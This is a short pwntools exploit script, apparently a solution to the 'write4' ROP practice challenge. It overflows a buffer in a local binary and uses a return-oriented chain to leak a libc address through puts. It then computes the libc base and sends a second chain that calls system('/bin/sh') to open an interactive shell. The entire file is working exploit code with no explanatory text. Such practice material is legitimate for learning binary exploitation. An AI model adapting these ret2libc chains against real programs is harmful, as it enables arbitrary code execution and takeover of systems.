from pwn import * 
context.log_level="debug"
p=process("./write4")
p.readuntil("> ")
puts=0x0000000004005d0
pr=0x0000000000400893
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload="D"*40+p64(pr)+p64(0x601018)+p64(puts)+p64(0x0000000004007B5)
gdb.attach(p)
p.send(payload.ljust(512,'\0'))
data=p.read(6)
base=u64(data.ljust(8,'\0'))-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*39+p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.readuntil("> ")
p.send(payload.ljust(512,'\0'))
p.interactive()
